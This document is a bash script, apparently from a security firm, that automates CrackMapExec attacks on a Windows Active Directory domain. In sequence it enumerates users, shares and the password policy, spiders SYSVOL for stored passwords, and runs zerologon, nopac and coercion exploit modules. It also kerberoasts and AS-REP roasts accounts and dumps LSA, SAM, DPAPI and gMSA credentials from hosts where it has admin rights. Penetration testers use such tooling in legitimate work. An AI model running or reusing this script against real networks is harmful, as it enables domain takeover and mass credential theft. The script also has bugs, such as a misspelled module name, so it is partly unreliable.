#!/bin/bash
#Triaxiom Security, 2023
#v.00000000001
#script for automating crackmapexec finding access, shares, passwords, kerberoasts, asreproasts, and exploits
#PTH functionality incoming in 2038


echo ' __       ______   ______   __  __       ______   __    __   ______    '
echo '/\ \     /\  __ \ /\___  \ /\ \_\ \     /\  ___\ /\ "-./  \ /\  ___\   '
echo '\ \ \____\ \  __ \\/_/  /__\ \____ \    \ \ \____\ \ \-./\ \\ \  __\   '
echo ' \ \_____\\ \_\ \_\ /\_____\\/\_____\    \ \_____\\ \_\ \ \_\\ \_____\ '
echo '  \/_____/ \/_/\/_/ \/_____/ \/_____/     \/_____/ \/_/  \/_/ \/_____/ '
echo ' '
echo ' '
echo ' '
echo 'Created by Triaxiom Security, 2023'
echo ' '
echo ' ' 
echo ' '



#usage : lazy-cme.sh user password dc-ip domain in-scope-ips-list

#check for args
	if [ $# -ne 5 ]; then
			echo 'Usage: lazy-cme.sh <user> <password> <dc-ip> <domain> <in-scope-ips-list>'
			exit -1
	fi

LOGFILE=$1-lazycme.log
#this might not be needed, going to leave it until all CME installs are ready
#could fix with:
# LOG='--log meep.log'
# then crackmap blah blah $LOG

#move config file to .bak; put new config with logging
mv ~/.cme/cme.conf ~/.cme/cme.conf.bak
printf '%s\n' '[CME]' 'workspace = default' 'last_used_db = smb' 'pwn3d_label = Pwn3d!' 'audit_mode =' 'log_mode = True' '' '[BloodHound]' 'bh_enabled = False' 'bh_uri = 127.0.0.1' 'bh_port = 7687' 'bh_user = neo4j' 'bh_pass = neo4j' '' '[Empire]' 'api_host = 127.0.0.1' 'api_port = 1337' 'username = empireadmin' 'password = Password123!' '' '[Metasploit]' 'rpc_host = 127.0.0.1' 'rpc_port = 55552' 'password = abc123' > ~/.cme/cme.conf
sleep 5

#starting up
date >> $LOGFILE
echo 'Starting script -- logging to '$1'-lazycme.log' 
echo ' '
echo ' '
echo 'Output is also logged to command oriented text files'
echo ' '
echo ' '

###############################################################################
###############################################################################
#NULL SESSIONS
###############################################################################

date >> $LOGFILE
echo 'NULL SESSIONS' >> $LOGFILE
echo 'Checking for null sessions'
echo '<<<<<<<<<<<<<<<<<<<<<<<< NULL SESSIONS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
	if crackmapexec smb -u '' -p '' | grep '[+]'; then
		echo 'SUCCESS!!'
		echo 'Grabbing users and pass-pol'
		crackmapexec smb -u '' -p '' --pass-pol | tee pass-pol-null.txt | tee -a $LOGFILE
		echo 'Running: crackmapexec smb --pass-pol | tee pass-pol-null.txt'
		crackmapexec smb -u '' -p '' --users | tee unparsed-users-null.txt | tee -a $LOGFILE
		echo 'Running: crackmapexec smb --users | tee unparsed-users-null.txt'
	else
		echo 'No null sessions :(' | tee -a $LOGFILE
	fi

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing '
echo ' '
echo ' '
echo ' '
echo ' '
###############################################################################
###############################################################################
#ANON SESSIONS
###############################################################################

date >> $LOGFILE
echo 'ANON SESSIONS' >> $LOGFILE
echo 'Checking for anonymous sessions'
echo '<<<<<<<<<<<<<<<<<<<<<<<< ANON SESSIONS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
	if crackmapexec smb -u 'a' -p '' | grep '[+]'; then
		echo 'SUCCESS!!' 
		echo 'Grabbing users and pass-pol'
		crackmapexec smb -u 'a' -p '' --pass-pol | tee pass-pol-anon.txt | tee -a $LOGFILE
		echo 'Running: crackmapexec smb --pass-pol | tee pass-pol-anon.txt'
		crackmapexec smb -u 'a' -p '' --users | tee unparsed-users-anon.txt | tee -a $LOGFILE
		echo 'Running: crackmapexec smb --users | tee unparsed-users-anon.txt'
	else
		echo 'No anonymous sessions :(' | tee -a $LOGFILE
	fi

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing '
echo ' '
echo ' '
echo ' '
echo ' '

###############################################################################
###############################################################################
#VERIFY CREDS
###############################################################################

date >> $LOGFILE
echo 'CRED VERIFICATION' >> $LOGFILE
echo 'Making sure you we dont lock out account'
echo '<<<<<<<<<<<<<<<<<<<<<<<< VERIFICATION >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' | tee access-proof.txt'

	if crackmapexec smb $3 -d $4 -u $1 -p $2 | grep '[+]'; then
		echo 'Lets get this bread'
		echo 'Logging authentication to text file'
		echo ' '
		crackmapexec smb $3 -d $4 -u $1 -p $2 | tee access-proof.txt >> $LOGFILE
	else
		echo 'Check user and pass' | tee -a $LOGFILE
		exit 0
	fi

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing '
echo ' '
echo ' '
echo ' '
echo ' '

###############################################################################
#BLOODHOUND
###############################################################################

date >> $LOGFILE
echo 'Grabbing Blodhound numnums: crackmapexec ldap '$5' -d '$4' -u '$1' -p '$2' --bloodhound --ns '$3' --collection All '
crackmapexec ldap $5 -d $4 -u $1 -p $2 --bloodhound --ns $3 --collection All | tee -a bloodhound.txt >> $LOGFILE

echo 'make sure to grab the zip from the file provided above!'
echo 'If this failed, check the name server and run: crackmapexec ldap '$5' -d '$4' -u '$1' -p '$2' --bloodhound --ns <nameserver> --collection All'


echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds -- go dump that zip into bloodhound dude'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#GET USERS
###############################################################################

date >> $LOGFILE
echo 'USERS' >> $LOGFILE
echo 'Grabbing users and parsing'
echo '<<<<<<<<<<<<<<<<<<<<<<<< USERS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --users| tee unparsed-users.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 --users | tee unparsed-users.txt | tee -a $LOGFILE

#this needs to be fixed
echo 'Cleaning up users...'
echo "Running: 'cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | sort | tee only-users.txt"
cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 | cut -d ' ' -f 1 | sort | tee only-users.txt >> $LOGFILE
sleep 3
echo 'Getting domain\users'
echo 'Running: cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 unparsed-users.txt | sort | tee domain-users.txt'
cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 | sort | tee domain-users.txt >> $LOGFILE

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5 

###############################################################################
###############################################################################
#PASSWROD POLICY
###############################################################################

date >> $LOGFILE
echo 'PASS POLICY' >> $LOGFILE
echo 'Grabbing password policy'
echo '<<<<<<<<<<<<<<<<<<<<<<<< PASSWORD POLICY >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --pass-pol| tee pass-pol.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 --pass-pol | tee pass-pol.txt | tee -a $LOGFILE

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds '
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#SHARES
###############################################################################

date >> $LOGFILE
echo 'SHARES' >> $LOGFILE
echo 'Grabbing Shares'
echo '<<<<<<<<<<<<<<<<<<<<<<<<SHARES>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'Runng: crackmapexec smb '$5' -d '$4' -u '$1' -p '$2' --shares | tee '$1'-shares.txt'
crackmapexec smb $5 -d $4 -u $1 -p $2 --shares | tee $1-shares.txt | tee -a $LOGFILE
echo 'Gonna have to manually run --spider on shares because Im too stupid to figure it out right meow'
#while read i; do crackmapexec smb $i -u $1 -p $2 --shares | tee '$1'-shares.txt; done < $5

#for line in `cat $5`
#do
#	crackmapexec smb $line -d $4-u $1 -p $2 --shares | tee '$1'-shares.txt
#done

#for line in $(cat $5)
#do
#	crackmapexec smb $line -u $1 -p $2 --shares | tee $1-shares.txt
#done

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#GET GOODIES FROM SHARES
###############################################################################

date >> $LOGFILE
echo 'PARSING SHARES' >> $LOGFILE
echo 'Taking out all the useless shares like IPC, PRINT, and putting readable shares into '$1'-shares-read.txt'
cat $1-shares.txt | grep -i 'read' | grep -vi 'ipc' | grep -vi 'print' | tee $1-shares-onlyread.txt | tee -a $LOGFILE
echo 'Manually search shares, building this for the future, listing commands to copy and paste'
echo ' #crackmapexec smb <ip> -d '$4' -u '$1' -p '$2' --spider <share> --pattern .doc | tee <ip>-shares-docs.txt'
echo ' #crackmapexec smb <ip> -d '$4' -u '$1' -p '$2' --spider <share> --pattern .txt | tee <ip>-shares-txt.txt'
echo ' #crackmapexec smb <ip> -d '$4' -u '$1' -p '$2' --spider <share> --pattern .csv | tee <ip>-shares-csv.txt'
echo ' #crackmapexec smb <ip> -d '$4' -u '$1' -p '$2' --spider <share> --pattern .xls | tee <ip>-shares-xls.txt'
echo ' #crackmapexec smb <ip> -d '$4' -u '$1' -p '$2' --spider <share> --pattern admin | tee <ip>-shares-admin.txt'
echo ' #crackmapexec smb <ip> -d '$4' -u '$1' -p '$2' --spider <share> --pattern pass | tee <ip>-shares-pass.txt'

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#AUTOSEARCH FOR LOOT IN SYSVOL
###############################################################################

date >> $LOGFILE
echo 'SEARCHING GPP-AUTOLOGIN' >> $LOGFILE
echo ' Grabbing goodies from SYSVOL'
echo '<<<<<<<<<<<<<<<<<<<<<<<< SYSVOL GOODIES >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M gpp_autologin | tee dc-gpp-autologin.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 -M gpp_autologin | tee dc-gpp-autologin.txt | tee -a $LOGFILE
sleep 3
date >> $LOGFILE
echo 'SEARCH GPP-PASSWORD' >> $LOGFILE
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M gpp_password | tee dc-gpp-password.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 -M gpp_password | tee dc-gpp-password.txt | tee -a $LOGFILE
sleep 3
date >> $LOGFILE
echo 'SPIDERING CPASSWORD' >> $LOGFILE
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --spider SYSVOL --pattern cpassword | tee dc-sysvol-pattern.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 --spider SYSVOL --pattern cpassword | tee dc-sysvol-pattern.txt | tee -a $LOGFILE
sleep 3
date >> $LOGFILE
echo 'SPIDERING ADMIN' >> $LOGFILE
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --spider SYSVOL --pattern admin |tee -a dc-sysvol-pattern.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 --spider SYSVOL --pattern admin |tee -a dc-sysvol-pattern.txt | tee -a $LOGFILE
sleep 3
date >> $LOGFILE
echo 'SPIDERING PWD' >> $LOGFILE
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt | tee -a $LOGFILE

echo "You gonna need to download the sysvol stuff with: smbclient -W "$4" -U "$1"%"$2" \\\\\\\\"$3"\\\\\sysvol"

#download sysvol
#smbclient -W <domain> -U '$1%$2' \\\\$4\\sysvol
# need to automate


echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#EXPLOITS
###############################################################################

date >> $LOGFILE
echo 'EXPLOITS' >> $LOGFILE
echo 'Checking for exploits'
echo '<<<<<<<<<<<<<<<<<<<<<<<< EXPLOITS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M zerologon' | tee -a vulns.txt
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M zerologon | tee -a vulns.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 -M zerologin | tee -a vulns.txt | tee -a $LOGFILE
echo ' ' | tee -a vulns.txt
sleep 5
echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M nopac' | tee -a vulns.txt
echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M nopac |tee -a vulns.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 -M nopac |tee -a vulns.txt | tee -a $LOGFILE
echo '' | tee -a vulns.txt
sleep 5
echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M webdav' | tee -a vulns.txt
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M webdav | tee -a vulns.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 -M webdav | tee -a vulns.txt | tee -a $LOGFILE
echo ' ' | tee -a vulns.txt
sleep 5
echo 'crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M shadowcoerce' | tee -a vulns.txt
echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' -M shadowcoerce | tee -a vulns.txt'
crackmapexec smb $3 -d $4 -u $1 -p $2 -M shadowcoerce | tee -a vulns.txt | tee -a $LOGFILE

#echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M petitpotam |tee -a vulns.txt'
#crackmapexec smb $5 -u $1 -p $2 -M petitpotam |tee -a vulns.txt

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#KERBEROASTING
###############################################################################

date >> $LOGFILE
echo 'KERBEROASTING' >> $LOGFILE
echo 'Searching for kerberoasts...'
echo '<<<<<<<<<<<<<<<<<<<<<<<< KERBEROASTING >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'crackmapexec ldap '$3' -d '$4' -u '$1' -p '$2' --kerberoasting kerberoasts.txt'
crackmapexec ldap $3 -d $4 -u $1 -p $2 --kerberoasting kerberoasts.txt | tee -a $LOGFILE

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#ASPREPROASTING
###############################################################################

date >> $LOGFILE
echo 'ASREPROASTING' >> $LOGFILE
echo 'Searching for asreproast...'
echo '<<<<<<<<<<<<<<<<<<<<<<<< ASREPROASTING >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'crackmapexec ldap '$3' -d '$4' -u '$1' -p '$2' --asreproast asreproast.txt'
crackmapexec ldap $3 -d $4 -u $1 -p $2 --asreproast asreproast.txt | tee -a $LOGFILE

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Continuing after 5 seconds'
echo ' '
echo ' '
echo ' '
echo ' '
sleep 5

###############################################################################
###############################################################################
#LOCAL ADMINS
###############################################################################

date >> $LOGFILE
echo 'CHECKING FOR LOCAL ADMIN' >> $LOGFILE
echo 'checking for local admins'
echo '<<<<<<<<<<<<<<<<<<<<<<<< LOCAL ADMIN >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
echo 'Running: crackmapexec smb '$5' -d '$4' -u '$1' -p '$2' | tee '$1'-local-admin.txt'

for line in $(cat $5)
do
	crackmapexec smb $line -d $4 -u $1 -p $2 | tee -a $1-local-admin.txt | tee -a $LOGFILE
done


	if cat $1-local-admin.txt | grep -i 'pwn'; then 
		pwn_hosts=$(cat $1-local-admin.txt | grep -i 'pwn' | cut -d ' ' -f 10)
		echo 'Founds some local admins... dumping creds (lsa, sam, dpapi, gmsa)'
		date >> $LOGFILE
		echo 'DUMPING LSA AND SAM' >> $LOGFILE
		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa | tee lsa.txt | tee -a $LOGFILE
		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --sam | tee -a sam.txt | tee -a $LOGFILE 
  		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --dpapi | tee -a dpapi.txt | tee -a $LOGFILE
    		crackmapexec ldap $pwn_hosts -d $4 -u $1 -p $2 --gmsa | tee -a gmsa.txt | tee -a $LOGFILE

      		cat lsa.txt sam.txt dpapi.txt gmsa.txt > all-creds.txt
	else
		echo 'No local admins, might check --local-auth' | tee -a $LOGFILE
	fi

echo ' '
echo ' '
echo ' '
echo ' '
echo ' Done '
echo ' '
echo ' '
echo ' '
echo ' '


echo ' Cleaning up master log file'
cat $LOGFILE | grep -vi 'esc' > cleaned-$LOGFILE
###############################################################################



###############################################################################
###############################################################################
#RDP ACCESS
###############################################################################

echo 'Check for RDP access, it can take a while/lag the f out'
echo 'crackmapexec rdp ips domain user password'
#date >> $LOGFILE
#echo 'RDP ACCESS' >> $LOGFILE
#echo 'looking for RDP'
#echo '<<<<<<<<<<<<<<<<<<<<<<<< RDP ACCESS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
#echo 'Running: crackmapexec rdp '$5' -d '$4' -u '$1' -p '$2' | tee '$1'-rdp.txt'
#crackmapexec rdp $5 -d $4 -u $1 -p $2 | tee $1-rdp.txt | tee -a $LOGFILE

#echo ' '
#echo ' '
#echo ' '
#echo ' '
#echo ' Continuing after 5 seconds'
#echo ' '
#echo ' '
#echo ' '
#echo ' '
#sleep 5


#TODO


#put this in after testing
# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa --sam --dpapi --gmsa
# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --users --pass-pol
# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 -M gpp_autologin gpp_password 
# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --kerberoast kerberoasts.txt --asreproast asreproasts.txt
# alias smb='crackmapexec smb $5 -d $4 -u $1 -p $2 ' 
# alias ldap='crackmapexec ldap $5 -d $4 -u $1 -p $2 ' 
# then gotta change EVERYTHING sadge



#if logging works, parse log file for shit

# add hash functionality
# automate shares for crackmapexe
# automate download sysvol
# add if loop for null/anon user parsing
